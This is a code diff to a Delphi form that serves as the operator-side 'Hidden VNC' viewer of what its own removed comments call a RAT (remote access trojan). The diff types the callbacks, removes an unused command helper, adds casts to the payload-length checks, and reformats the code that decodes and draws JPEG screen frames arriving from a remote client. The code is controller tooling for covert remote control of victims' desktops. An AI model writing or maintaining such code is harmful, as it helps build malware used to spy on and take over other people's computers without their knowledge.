@@ -15,6 +15,9 @@ type
     DataSize : Cardinal;
   end;
 
+  TSendJSONCallback = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
+  TUnregisterCallback = procedure(aLine: TncLine) of object;
+
   TForm10 = class(TForm)
     PaintBox1: TPaintBox;
     StatusBar1: TStatusBar;
@@ -42,18 +45,17 @@ type
   private
     FLine: TncLine;
     FClientID: string;
-    FSendJSON: procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
-    FOnUnregister: procedure(aLine: TncLine) of object;
+    FSendJSON: TSendJSONCallback;
+    FOnUnregister: TUnregisterCallback;
 
     FLock: TCriticalSection;
     FLastBitmap: TBitmap;
     FIsCapturing: Boolean;
 
-    procedure SendHVNCCommand(const Action: string; Params: TJSONObject = nil);
     procedure DrawFrame(const FrameBytes: TBytes);
   public
     procedure SetupForClient(aLine: TncLine; const ClientID: string;
-      ASendJSON: TMethod; AOnUnregister: TMethod);
+      ASendJSON: TSendJSONCallback; AOnUnregister: TUnregisterCallback);
     procedure HandleHiddenVNCJSON(JSONObj: TJSONObject);
     procedure HandleBinaryPacket(PacketType: Byte; const Payload: TBytes);
     procedure DetachCallbacks;
@@ -112,12 +114,12 @@ begin
 end;
 
 procedure TForm10.SetupForClient(aLine: TncLine; const ClientID: string;
-  ASendJSON: TMethod; AOnUnregister: TMethod);
+  ASendJSON: TSendJSONCallback; AOnUnregister: TUnregisterCallback);
 begin
   FLine := aLine;
   FClientID := ClientID;
-  TMethod(FSendJSON) := ASendJSON;
-  TMethod(FOnUnregister) := AOnUnregister;
+  FSendJSON := ASendJSON;
+  FOnUnregister := AOnUnregister;
 
   Caption := 'Hidden VNC - ' + ClientID;
 end;
@@ -128,28 +130,6 @@ begin
   FOnUnregister := nil;
 end;
 
-procedure TForm10.SendHVNCCommand(const Action: string; Params: TJSONObject);
-var
-  JSONObj: TJSONObject;
-begin
-  if not Assigned(FSendJSON) then Exit;
-
-  JSONObj := TJSONObject.Create;
-  try
-    JSONObj.AddPair('action', Action);
-    if Assigned(Params) then
-    begin
-      // Logic to merge params if needed, but here we usually just pass them
-      // For simplicity in this RAT, we just add action and caller provides rest
-    end;
-    FSendJSON(FLine, JSONObj);
-  finally
-    // Note: in this RAT architecture, SendJSON doesn't take ownership of JSONObj
-    // It's usually caller's responsibility to free it.
-    JSONObj.Free;
-  end;
-end;
-
 procedure TForm10.Button1Click(Sender: TObject);
 var
   JSONObj: TJSONObject;
@@ -158,7 +138,7 @@ var
 begin
   if not FIsCapturing then
   begin
-    QualityStr := ComboBox1.Text.Replace('%', '');
+    QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
     Quality := StrToIntDef(QualityStr, 50);
 
     JSONObj := TJSONObject.Create;
@@ -247,10 +227,10 @@ var
   Header: THiddenVNCFrameHeader;
   FrameData: TBytes;
 begin
-  if Length(Payload) < SizeOf(THiddenVNCFrameHeader) then Exit;
+  if Cardinal(Length(Payload)) < SizeOf(THiddenVNCFrameHeader) then Exit;
 
   Move(Payload[0], Header, SizeOf(THiddenVNCFrameHeader));
-  if (Header.DataSize > 0) and (Length(Payload) >= (SizeOf(THiddenVNCFrameHeader) + Header.DataSize)) then
+  if (Header.DataSize > 0) and (Cardinal(Length(Payload)) >= (SizeOf(THiddenVNCFrameHeader) + Header.DataSize)) then
   begin
     SetLength(FrameData, Header.DataSize);
     Move(Payload[SizeOf(THiddenVNCFrameHeader)], FrameData[0], Header.DataSize);
@@ -268,25 +248,26 @@ begin
       MS.WriteBuffer(FrameBytes[0], Length(FrameBytes));
     MS.Position := 0;
 
-    TThread.Synchronize(nil, procedure
-    var
-      Jpg: TJPEGImage;
-    begin
-      FLock.Enter;
-      try
-        Jpg := TJPEGImage.Create;
+    TThread.Synchronize(nil,
+      procedure
+      var
+        Jpg: TJPEGImage;
+      begin
+        FLock.Enter;
         try
-          Jpg.LoadFromStream(MS);
-          FLastBitmap.SetSize(Jpg.Width, Jpg.Height);
-          FLastBitmap.Canvas.Draw(0, 0, Jpg);
+          Jpg := TJPEGImage.Create;
+          try
+            Jpg.LoadFromStream(MS);
+            FLastBitmap.SetSize(Jpg.Width, Jpg.Height);
+            FLastBitmap.Canvas.Draw(0, 0, Jpg);
+          finally
+            Jpg.Free;
+          end;
         finally
-          Jpg.Free;
+          FLock.Leave;
         end;
-      finally
-        FLock.Leave;
-      end;
-      PaintBox1.Invalidate;
-    end);
+        PaintBox1.Invalidate;
+      end);
   finally
     MS.Free;
   end;
